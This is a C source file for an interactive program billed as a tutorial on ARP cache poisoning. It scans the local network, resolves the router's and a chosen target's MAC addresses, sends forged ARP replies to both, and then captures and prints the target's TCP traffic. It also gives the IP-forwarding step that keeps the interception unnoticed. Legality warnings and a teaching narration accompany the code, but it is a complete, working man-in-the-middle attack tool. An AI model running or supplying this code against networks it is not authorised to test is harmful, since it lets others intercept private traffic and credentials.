﻿#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <pcap.h>
#include <ctype.h>
#include <signal.h>
#include <wchar.h>
#include <locale.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>

#include "tools/nettools.h"


void enter();
int get_dev(char[]);
void scon_to_arp(char[7][60]);
void print_payload(unsigned char *, int);
void print_tcp(unsigned char *, unsigned int );
void print_arp(char *, char *, char *, char *, char *, char *, char *);
int recv_tcp(int, unsigned char *, char *);
void make_packet(unsigned char *, unsigned char *, 
                                  unsigned char *, 
                                  unsigned char *, 
                                  unsigned char *, 
                                  uint8_t[], 
                                  uint8_t[], 
                                  unsigned short int);


char *op[]          = {"ARP_REQUEST", "ARP_REPLY"};
wchar_t emojis      = 0x1F000;


int main(int argc, char *argv[]) {
    char dev[IFNAMSIZ];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];    
    char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN], reply_str[IPSLEN];
    char h_sufix[4], t_sufix[4];
    char cont[6];
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
    uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
    int sock;
    char scon[7][60];

    unsigned char *recv_buf = malloc(ARPSIZ); 


    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == FAIL) {
        if (getuid() != 0) {
            printf("Run again as sudo! (sudo %s)\n", argv[0]);
            exit(0);
        }
        printf("Error : raw sock create failed\n");
        exit(1);
    }

    // 4 emojis
    setlocale(LC_ALL, "en_US.utf8");
    wchar_t snake = emojis + 1037;

    printf("\n\033[0;42m====================================================================\033[0m\n");
    printf("\nWelcome to \033[0;31mARP POISON\033[0m!  %lc %lc %lc %lc\n\n", snake, snake, snake, snake); 
    printf("This is a tutorial designed to teach a little bit about how ARP packets work.\n");
    printf("And scare you a little bit about how easy they are to exploit.\n");
    printf("This is NOT designed for people who already know how ARP cache poisoning works or don't care.\n");
    printf("If you are looking for a quick way to perform ARP spoofing download dsiff and wireshark.\n");
    printf("\nWe are going to walk you through the steps of making ARP reqests and replies.\n");
    printf("And how they can be altered to spy on devices on the same network as you\n");
    printf("\n\033[0;42m===================================================================\033[0m\n\n");
    enter();

    printf("\nARP cache poisoning or ARP spoofing is a so-called man-in-the-middle attack.\n");
    printf("It allows to spy on devices connected to the same network as you.\n");
    printf("With ARP packets you can trick them into sending data intended for the router to you.\n");
    printf("And trick the router into sending internet trafic intended for them to you also.\n");
    printf("By forwarding the trafic back and forth, it is possible to look at it without either device noticing.\n");
    printf("Thus becoming an invisible 'man-in-the-middle' between the target device and the host router.\n\n");
    printf("Please bear in mind that you will need a device you are allowed to spy on or the following will be illegal.\n");
    printf("Your phone is a good bet.\n\n");
    enter();

    printf("\nIn order to send ARP packets we are going to need to know what interface to use.\n");
    printf("The interface will probably be either your Ethernet (wired) or Wi-Fi interface.\n\n");
    enter();

    // get interface by user input
    printf("\nI've detected these interfaces on your system (its probably the first one):\n\n");
    if (get_dev(dev) == FAIL) {
        printf("Failed to get interface\n");
        exit(2);
    }

    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        printf("Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)\n", dev);
        exit(3);
    }

    // print/save interface info 
    memcpy(our_mac, (unsigned char *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    printf("It's MAC and IP addresses are:\n");
    printf("------------------------------------------------\n");
    printf("    MAC address : \033[0;34m%s\033[0m\n", our_m_str);
    memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
    memcpy(target_ip, our_ip, IP_ALEN);
    memcpy(host_ip, our_ip, IP_ALEN);
    ip_to_str(our_ip_str, our_ip);
    printf("    IP address  : \033[0;34m%s\033[0m\n",  our_ip_str);
    fflush(stdout);
    printf("------------------------------------------------\n\n");
    enter();

    char LAN_ip[IPSLEN];
    sprintf(LAN_ip, "%d.%d.%d", 
            our_ip[0],
            our_ip[1],
            our_ip[2]);

    // scan for IP's
    printf("\nScanning your network...\n");
    struct ip_mac *p, *on_ntwrk;
    p = on_ntwrk = ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac);
    printf("\nFound IP's:\n\033[0;34m");

    while (p) {
        printf("%d.%d.%d.%d\n", p->ip[0], p->ip[1], p->ip[2], p->ip[3]);
        p = p->next;
    }
    printf("\033[0m\n");
    enter();

    // get target IP from user 
    printf("\nThe host and target will have to be on the same network as your interface\n");
    printf("This means we know the first 3 fields of the IP already\n\n");
    enter();

    printf("\nEnter final field of your targets IP address (they have to be online) \033[0;34m%s.\033[0m", 
                        LAN_ip);

    while (1) {
        fgets(t_sufix, 4, stdin);
        target_ip[3] = atoi(t_sufix);
        ip_to_str(target_str, target_ip);

        if (!is_valid_ip(target_str)) {
            printf("Error %s is not a vaild ip address, try again: \n", target_str);
            while (getchar() != '\n');
            continue;
        }
        break;
    }
    
    // get host IP from user
    printf("If the host is your router last digit is probably 1 (\033[0;34m%s.\033[0;31m1\033[0m) if its not, please enter it: ", 
                                    LAN_ip);
    while (1) {
        fgets(h_sufix, 4, stdin);

        if ((host_ip[3] = atoi(h_sufix)) == 0) {
            host_ip[3] = 1;
        }
        ip_to_str(host_str, host_ip);

        if (!is_valid_ip(host_str)) {
            printf("Error %s is not a vaild ip address\n", host_str);
            while (getchar() != '\n');
            continue;
        }
        break;
    }


    // check IP's
    printf("\nNow we can send out an ARP request each of these IP's\n");
    printf("target : \033[0;34m%s\033[0m\n", target_str);
    printf("host   : \033[0;34m%s\033[0m\n\n", host_str);
    enter();

    //explain ARP request 
    printf("\nAn ARP request is a very small packet of data sent from your computer or phone to everyone on your network.\n");
    printf("The packet is normaly only 42 bytes long, which takes up no more memory than this sentence:\n");
    printf("\nHi, I am a sentence of only 42 characters.\n\n");
    printf("The packet contains MAC and IP addresses.\n");
    printf("You probably know what an IP is, but maybe not a MAC.\n");
    printf("A MAC address is the hardware address of your network interface is assigned by the manufacturer.\n");
    printf("Devices on your network will use the MAC address to communicate rather than IP.\n");
    printf("While your computer might know the IP it needs to send its data to (e.g. your router), it might not know the MAC address\n");
    printf("The ARP request is then sent out to your network asking 'what is the MAC address of <someIP>'.\n");
    printf("Depending on where you are, 'your network' most likely means everyone using the same Wi-Fi as you, this is called a LAN.\n");
    printf("So if you are at home you probably don't need to worry about this attack unless your neibours are hackers.\n");
    printf("But if you are in a coffee shop, you want to be using https.\n");
    printf("\nNOTE: this tutorial assumes you are on a 'class C' network meaning only the last field of your IP varies in your LAN.\n");
    printf("Let's take a look at our first request.\n\n");
    enter();

    // print first request
    printf("\nThe first ARP request will look like this:\n\n");
    enter();
    
    sprintf(scon[0], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[1], "\033[0;31m%s\033[0m <- broadcast address", "FF-FF-FF-FF-FF-FF");
    sprintf(scon[2], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[3], "\033[0;31m%s\033[0m <- don't know yet", "00-00-00-00-00-00");
    sprintf(scon[4], "\033[0;34m%-17s\033[0m <- your IP", our_ip_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- the ip of the host", host_str);
    sprintf(scon[6], "\033[0;31m%-17d\033[0m =  %s", 1, op[0]);
    scon_to_arp(scon);
    enter();

    printf("\n(Well.. It actualy looks like this:\n\n");
    make_packet(recv_buf, our_mac,
                     broadcast, 
                     our_mac, 
                     empty, 
                     our_ip, 
                     target_ip,
                     ARPOP_REQUEST);
    print_payload(recv_buf, ARPSIZ);

    printf("\nOr it does when translated from raw bytes to hexadecimal, but I've parsed into a table it because thats not important.\n");
    printf("If you look closely you will see most of the data from above.)\n\n");
    printf("Moving on..\n\n");
    enter();

    // explain
    printf("\nSetting the Destination MAC to 'broadcast address' (\033[0;31mFF-FF-FF-FF-FF-FF\033[0m) ");
    printf("will send the packet to everyone in your IP range (\033[0;34m%s.\033[0;31m0-224\033[0m).\n", LAN_ip);
    printf("The Target MAC is left blank (\033[0;31m00-00-00-00-00-00\033[0m) beacause this is what we are asking for.\n");
    printf("Setting the Target IP to the host and the Op code to %s (\033[0;31m1\033[0m) "
                          , op[0]);
    printf("will ask everone that receives the packet to check their ARP cache for this IP.\n");
    printf("The ARP cache is a table of all known IP and MAC addresses on your local area network (LAN).\n");
    printf("Your computer must know the MAC address of any device on your network it wishes to comunicate with.\n");
    printf("If any device on your network has the Target IP their ARP cache they will respond with an %s containing its MAC address.\n"
                          , op[1]);
    printf("You normally use this to update your ARP cache, we will use it to get the MAC address of the host.\n\n");
    printf("Lets send it..\n\n");
    enter();

    // send request
    printf("\n");
    send_arp(sock, ifreq_i.ifr_ifindex, 
            our_mac,
            broadcast, 
            our_mac, 
            empty, 
            our_ip, 
            host_ip,
            ARPOP_REQUEST);

    printf("Sent\n");
    printf("Now we wait for a reply ...\n\n");
    struct ether_arp *arp = recv_arp(sock, ARPOP_REPLY, host_ip);
    printf("Got one!\n\n");
    enter();

    // parse and print response
    memcpy(host_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(host_m_str, host_mac);
    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", host_m_str);
    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[2], "\033[0;31m%s\033[0m <- Host MAC", host_m_str);
    sprintf(scon[3], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    snprintf(reply_str, IPSLEN, "%d.%d.%d.%d", arp->arp_spa[0],
                                               arp->arp_spa[1],
                                               arp->arp_spa[2],
                                               arp->arp_spa[3]);
    sprintf(scon[4], "\033[0;34m%-17s\033[0m <- host IP", reply_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- your IP", our_ip_str);
    sprintf(scon[6], "\033[0;34m%-17d\033[0m =  %s", ntohs(arp->ea_hdr.ar_op), op[ntohs(arp->ea_hdr.ar_op)-1]);
    scon_to_arp(scon);
    enter();

    // explain 
    printf("\nIf all went well you should now have the hosts MAC.\n");
    printf("If so, it will be in the Source MAC field, here its \033[0;31m%s\033[0m.\n", host_m_str);
    printf("The Source address field tells us who reponded with this infomation.\n"); 
    printf("As all Wi-Fi trafic passes through the router, this is most likley the same MAC.\n");
    printf("\nLets save this MAC and do the same for the target.\n");
    printf("The ARP request for the target will be the same as for the host, but with the target's IP in place of the host's.\n\n");
    enter();

    sprintf(scon[0], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[1], "\033[0;31m%s\033[0m <- broadcast address", "FF-FF-FF-FF-FF-FF");
    sprintf(scon[2], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[3], "\033[0;31m%s\033[0m <- don't know yet", "00-00-00-00-00-00");
    sprintf(scon[4], "\033[0;34m%-17s\033[0m <- your IP", our_ip_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- the ip of the target", target_str);
    sprintf(scon[6], "\033[0;31m%-17d\033[0m =  %s", 1, op[0]);
    scon_to_arp(scon);
    enter();

    // send
    printf("\n");
    send_arp(sock, ifreq_i.ifr_ifindex, 
            our_mac,
            broadcast, 
            our_mac, 
            empty, 
            our_ip, 
            target_ip,
            ARPOP_REQUEST);

    printf("Sent\n");
    printf("Now we wait for a reply ...\n\n");
    arp = recv_arp(sock, ARPOP_REPLY, target_ip);
    printf("Got one! \n\n");
    enter();

    // parse and print response
    memcpy(target_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(target_m_str, target_mac);
    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", target_m_str);
    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    sprintf(scon[2], "\033[0;31m%s\033[0m <- target MAC", target_m_str);
    sprintf(scon[3], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
    snprintf(reply_str, IPSLEN, "%d.%d.%d.%d", arp->arp_spa[0],
                                               arp->arp_spa[1],
                                               arp->arp_spa[2],
                                               arp->arp_spa[3]);
    sprintf(scon[4], "\033[0;34m%-17s\033[0m <- target IP", reply_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- your IP", our_ip_str);
    sprintf(scon[6], "\033[0;34m%-17d\033[0m =  %s", ntohs(arp->ea_hdr.ar_op), op[ntohs(arp->ea_hdr.ar_op)-1]);
    scon_to_arp(scon);
    enter();

    printf("\nSo now we have the targets MAC! Its \033[0;31m%s\033[0m.\n\n", target_m_str);
    enter();

    // explain poison and warn
    printf("\nNow that we have the devices MAC addresses we can move onto the actual cache poisoning!\n");
    printf("NOTE: if the target device is not yours and you do not have permission to access it this step is ILLEGAL.\n");
    printf("DO NOT CONTINUE without permissions, if you do not have permission, restart and try it on your phone.\n\n");
    enter();

    printf("\nMost likely your computer alrealdy had at least the host MAC in your ARP cache (see this by typing arp -a into a terminal).\n");
    printf("The ARP cache is a temporary table or map of MAC and IP addresses on your network.\n");
    printf("It is temporary because IP addreses change and can be the same over different LAN's\n\n");

    printf("However by going though this process we have already seen all the steps necessary for the trick we want to show.\n");
    printf("ARP cache poisoning exploits the fact that the ARP cache allows unsolicited ARP replies to update it.\n");
    printf("Because it is imposisble to know if the replies are legit or not we can send ARP replies that will change:\n");

    printf("\nThe MAC of the host in the target's ARP cache to your MAC address.\n");
    printf("The MAC of the target in the host's ARP cache to your MAC address.\n\n");

    printf("All network trafic in your LAN is sent by MAC instead of IP.\n");
    printf("So the result of falsely updating the cache in this way is to make the target send you any data intended for the web to you.\n");
    printf("And the router (host) to send all internet data intended for the target to you.\n");
    printf("If you make sure to forward all of this data, neither the target nor the router will notice anything.\n");
    printf("But with a network sniffer like wireshark you can see everything the target is doing online including any inputted passwords\n");
    printf("Fortunatly because of ssl (http\033[0;31ms\033[0m) this will probably all be very encrypted.\n");
    printf("But if the target uses http, you can read it directly.\n\n");
    enter();

    printf("\nFirst we will send several ARP replies to the host.\n");
    printf("They will look like this:\n\n");
    enter();

    // print malicious packet 1
    sprintf(scon[0], "\033[0;34m%s\033[0m <- your MAC",     our_m_str);
    sprintf(scon[1], "\033[0;31m%s\033[0m <- host MAC",     host_m_str);
    sprintf(scon[2], "\033[0;31m%s <- YOUR MAC\033[0m",     our_m_str);
    sprintf(scon[3], "\033[0;34m%s\033[0m <- host MAC",     host_m_str);
    sprintf(scon[4], "\033[0;31m%-17s <- TARGET IP\033[0m", target_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- host IP",   host_str);
    sprintf(scon[6], "\033[0;31m%-17d\033[0m =  %s",        ARPOP_REPLY, op[ARPOP_REPLY-1]);
    scon_to_arp(scon);
    enter();

    printf("\nAs you can see, we have set the source MAC to our own, but the source IP to the targets.\n");
    printf("This should cause the host (router) to reassociate the target's IP with your MAC.\n");
    printf("So when traffic comes in from the WWW.internet (or anywhere) for this IP, it will send it to you instead.\n\n");
    printf("We will then send several ARP replies to the target, they will look like this:\n\n");
    enter();

    // print malicious packet 2 
    sprintf(scon[0], "\033[0;34m%s\033[0m <- your MAC",   our_m_str);
    sprintf(scon[1], "\033[0;31m%s\033[0m <- target MAC", target_m_str);
    sprintf(scon[2], "\033[0;31m%s <- YOUR MAC\033[0m",   our_m_str);
    sprintf(scon[3], "\033[0;34m%s\033[0m <- target MAC", target_m_str);
    sprintf(scon[4], "\033[0;31m%-17s <- HOST IP\033[0m", host_str);
    sprintf(scon[5], "\033[0;34m%-17s\033[0m <- target IP", target_str);
    sprintf(scon[6], "\033[0;31m%-17d\033[0m =  %s", ARPOP_REPLY, op[ARPOP_REPLY-1]);
    scon_to_arp(scon);
    enter();

    printf("\nThis is the same as the last but sent to the target with the target MAC and the host's IP.\n");
    printf("This should make the host reassociate our MAC with the targets IP.\n");
    printf("So when the target wants to get a webpage or send it some data it will ask/send it to us.\n");
    printf("It also means it won't see anything weird about us sending it the pages it has requested.\n");
    printf("We can do that because the router is sending it all to us.\n\n");

    printf("for this to work you will have to turn on IP forwarding, on Linux this is done by typing\n");
    printf("sudo echo 1 > /proc/sys/net/ipv4/ip_forward\n");
    printf("If that doesn't work try:\n");
    printf("sudo nano /proc/sys/net/ipv4/ip_forward      # and change the 0 to a 1\n");
    printf("If your not using Linux, google it\n\n");

    printf("If you have done this, we will now send %d packets to each with a delay of 1 second, so this will take just under a minute.\n\n"
                           , NPACKS);
    enter();

    // poison host
    printf("\n\033[0;32mPoisoning host...\033[0;31m\n");
    for (int i = NPACKS; i > 0; --i) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,
                    host_mac, 
                    our_mac, 
                    host_mac, 
                    target_ip, 
                    host_ip,
                    ARPOP_REPLY);
            printf("Sent 42 bytes\n");
            sleep(1);
    }

    // poison target 
    printf("\n\033[0;32mPoisoning target...\033[0;31m\n");
    for (int i = NPACKS; i > 0; --i) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,
                    target_mac,
                    our_mac,
                    target_mac,
                    host_ip,
                    target_ip,
                    ARPOP_REPLY);
            printf("Sent 42 bytes\n");
            sleep(1);
    }
    printf("\033[0m");
    
    // wait for first TCP packet or timeout
    printf("\n\nDone! now we can wait and sniff for our first TCP packet from the target or host!\n\n");
    printf("Waiting...\n");

    unsigned char *tcp_buf = malloc(TCPBUFZ);
    int nbytes = recv_tcp(sock, tcp_buf, target_str);
    printf("\n\nGot one!\n\n");
    enter();

    // print first packet
    print_tcp(tcp_buf, nbytes);

    printf("\n\nYou got your first packet!\n");
    printf("Theres a small chance you have gotten it for some other reason but probably it has been redirected from the target!\n");
    printf("Now if you want to analyse the stream of stolen packets you should probably jump on wireshark or use tcpdump.\n");
    printf("This program is not really made for bulk packet sniffing, but if you like we can keep showing you TCP trafic from the target.\n");
    printf("\nType 'more' to keep seeing trafic or press enter to leave this tutorial.\n");
    fgets(cont, 6, stdin);
    cont[4] = 0;
    
    // print all TCP trafic until ctrl+c
    if (strncmp(cont, "more", 4) != 0) {
        printf("\nBye! :)\n");
        free(tcp_buf);
        close(sock);
        exit(0);
    }
    while (1) {
        nbytes = recv_tcp(sock, tcp_buf, target_str);
        print_tcp(tcp_buf, nbytes);
        printf("ctrl+c to quit\n");
    }
}




void scon_to_arp(char scon[7][60]){
    print_arp(scon[0],
              scon[1], 
              scon[2], 
              scon[3], 
              scon[4], 
              scon[5], 
              scon[6]); 
}

void enter() {
    printf("(enter to continue)");
    char e = 0;
    while ((e = getchar()) != '\n');
}

void print_arp(char *if_mac, char *e_dest, char *s_mac, char *d_mac, char *s_ip, char *t_ip, char *op) {


    char arp_p[] = "\n****************************ARP PACKET****************************\n"
                   "                                                                  \n"
                   "Ethernet Header                                                   \n"
                   "	|-Source Address           :  %s               \n"
                   "	|-Destination Address      :  %s               \n"
                   "	|-EtherType                :  0x0806                            \n"
                   "                                                                  \n"
                   "ARP header                                                        \n"
                   "	|-Source MAC               :  %s               \n"
                   "	|-Target MAC               :  %s               \n"
                   "	|-Source IP                :  %s                \n"
                   "	|-Target IP                :  %s                \n"
                   "	|-Hardware Type            :  1                               \n"
                   "	|-Protocol Type            :  2048                            \n"
                   "	|-Op code                  :  %s                               \n"
                   "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n";
    printf(arp_p, if_mac, e_dest, s_mac, d_mac, s_ip, t_ip, op);
}

int get_dev(char dev[IFNAMSIZ]) {
    int i, idx, namelen;
    char errbuf[PCAP_ERRBUF_SIZE];
    char idxstr[4];
    pcap_if_t *devs, *d;

    if (pcap_findalldevs(&devs, errbuf) == -1) {
        fprintf(stderr, "Error : could not find interfaces %s\n", errbuf);
        return FAIL;
    }

    for (i = 1, d = devs; d != NULL; ++i, d = d->next) {
        printf("Device %2d: \033[0;34m%s\033[0m\n", i, d->name);
    }

    while (1) {
        printf("\nChoose your Wi-Fi interface by number: ");
        fgets(idxstr, sizeof idxstr, stdin);
        idx = atoi(idxstr);
        
        if (idx > i || idx < 1) {
            printf("%d is out of range, try again!\n", idx);

            // effectively flush stdin
            if (idxstr[strlen(idxstr)-1] != '\n') {
                while (getchar() != '\n');
            }
        }
        else {
            break;
        }
    }
    for (i = 1, d = devs; i < idx; ++i, d = d->next);
    printf("\nYou chose:\033[0;34m %s\033[0m\n", d->name);

    if ((namelen = strlen(d->name)) > IFNAMSIZ) {
        printf("Error : interface name too large (change it)\n");
        return FAIL;
    }
    strncpy(dev, d->name, namelen);
    dev[namelen] = 0;
    pcap_freealldevs(devs);
    return namelen;
}

void make_packet(unsigned char *sendbuff, unsigned char *s_mac, 
                                unsigned char *d_mac, 
                                unsigned char *arp_s_mac, 
                                unsigned char *arp_t_mac, 
                                uint8_t arp_s_ip[4], 
                                uint8_t arp_t_ip[4], 
                                unsigned short int opcode) {
    memset(sendbuff, 0, ARPSIZ);
    struct ethhdr *eth = (struct ethhdr *)(sendbuff);
    memcpy(eth->h_source, s_mac, ETH_ALEN);
    memcpy(eth->h_dest, d_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);
    struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
    memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
    memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
    memcpy(arp->arp_spa, arp_s_ip, 4);
    memcpy(arp->arp_tpa, arp_t_ip, 4);
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(2048);
    arp->ea_hdr.ar_op  = htons(opcode);
    arp->ea_hdr.ar_hln = ETH_ALEN;   
    arp->ea_hdr.ar_pln = 4;
}

// only to print TCP packet vvvv
static void print_mac(unsigned char mac[ETH_ALEN]) {
    int i;

    for (i = 0; i < ETH_ALEN-1; ++i) {
        printf("%.2X-", mac[i]);
    }
    printf("%.2X\n", mac[ETH_ALEN-1]);
}

void print_payload(unsigned char *data, int data_size) {
    int j, i;

    j = 0;
    for (i = 0; i < data_size; i++) {

        // if end of line, decode hex
        if (i != 0 && i%16 == 0) {
            printf("|");

            for (j = i-16; j < i; j++) {

                // print either ascii or dot
                if (isprint(data[j])) {
                    printf("%c", data[j]);
                }
                else {
                    printf(".");
                }
            }
            printf("|\n");
        }

        // if end of data, decode hex
        if (i == data_size-1 && i%16 != 0) {
            int left = j+16;

            for (int k = i; k < left; k++) {
                printf("   ");
            }
            printf("|");
            while (j++ < i) {

                // print either ascii or dot
                if (isprint(data[j])) {
                    printf("%c", data[j]);
                }
                else {
                    printf(".");
                }
            }
            for (int k = i; k < left; k++) {
                printf(" ");
            }
            printf("|\n");
            break;
        }

        // print hex
        printf("%.2X ", data[i]);
    }
}

void print_eth(unsigned char *packet) {

    // Handle Ethernet header by casting buffer
    struct ether_header *eth = (struct ether_header *)(packet);

    printf("\nEthernet Header\n");
    printf("\t|-Source Address           :  ");
    print_mac(eth->ether_shost);
    printf("\t|-Destination Address      :  ");
    print_mac(eth->ether_dhost);
    printf("\t|-EtherType                :  0x%X\n", ntohs(eth->ether_type));
}


int print_eth_and_ip(unsigned char *packet) {
    struct sockaddr_in src, dst;

    print_eth(packet);

    // Increment buffer over Ethernet header to parse ip header
    struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ether_header));
    memset(&src, 0, sizeof(src));
    src.sin_addr.s_addr = ip->saddr;
    memset(&dst, 0, sizeof(dst));
    dst.sin_addr.s_addr = ip->daddr;

    printf("\nIP Header\n");
    printf("\t|-Version                  :  %d\n",       (unsigned int)ip->version);
    printf("\t|-Internet Header Length   :  %d DWORDS or %d Bytes\n",
                                                         (unsigned int)ip->ihl,
                                                         ((unsigned int)(ip->ihl))*4);
    printf("\t|-Type Of Service          :  %d\n",       (unsigned int)ip->tos);
    printf("\t|-Total Length             :  %d Bytes\n", ntohs(ip->tot_len));
    printf("\t|-Identification           :  %d\n",       ntohs(ip->id));
    printf("\t|-Time To Live             :  %d\n",       (unsigned int)ip->ttl);
    printf("\t|-Protocol                 :  %d\n",       (unsigned int)ip->protocol);
    printf("\t|-Header Checksum          :  %d\n",       ntohs(ip->check));
    printf("\t|-Source IP                :  %s\n",       inet_ntoa(src.sin_addr));
    printf("\t|-Destination IP           :  %s\n",       inet_ntoa(dst.sin_addr));
    return ip->ihl*4;
}


void print_tcp(unsigned char *packet, unsigned int packet_size) {
    int iphdrlen;

    printf("\n\n****************************TCP PACKET****************************\n");

    iphdrlen = print_eth_and_ip(packet);

    // Increment buffer over ip header to parse UDP
    struct tcphdr *tcp = (struct tcphdr*)(packet + iphdrlen + sizeof(struct ether_header));

    printf("\nTCP header\n");
    printf("\t|-Source Port              :  %d\n", ntohs(tcp->source));
    printf("\t|-Destination Port         :  %d\n", ntohs(tcp->dest));
    printf("\t|-Sequence Number          :  %d\n", ntohs(tcp->seq));
    printf("\t|-ACK Number               :  %d\n", ntohs(tcp->ack_seq));
    printf("\t|--------flags-------\n");
    printf("\t\t|-Urgent                 :  %d\n", ntohs(tcp->urg));
    printf("\t\t|-ACK                    :  %d\n", ntohs(tcp->ack));
    printf("\t\t|-Push                   :  %d\n", ntohs(tcp->urg));
    printf("\t\t|-RST                    :  %d\n", ntohs(tcp->urg));
    printf("\t\t|-SYN                    :  %d\n", ntohs(tcp->urg));
    printf("\t\t|-Finish                 :  %d\n", ntohs(tcp->urg));

    // Print payload 
    unsigned char *data = (packet + iphdrlen + sizeof(struct ether_header) + sizeof(struct tcphdr));
    int data_size = packet_size - (iphdrlen + sizeof(struct ether_header) + sizeof(struct tcphdr));
    
    printf("\n\nPayload\n\n");
    print_payload(data, data_size);
    
    printf("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n");
}

int recv_tcp(int sock, unsigned char *buf, char *t_ip) {
    int bytes_recvd;
    struct sockaddr_in src, dst;

    while (1) {
        bytes_recvd = read(sock, buf, TCPBUFZ);
        
        if (ntohs(((struct ethhdr*)(buf))->h_proto) == ETHERTYPE_IP) {

            struct iphdr *ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
            memset(&src, 0, sizeof(src));
            src.sin_addr.s_addr = ip->saddr;
            memset(&dst, 0, sizeof(dst));
            dst.sin_addr.s_addr = ip->daddr;

            if (strcmp(inet_ntoa(src.sin_addr), (char *)t_ip) == 0 || strcmp(inet_ntoa(dst.sin_addr), (char *)t_ip) == 0) {
                return bytes_recvd;
            }
        }
    }
}
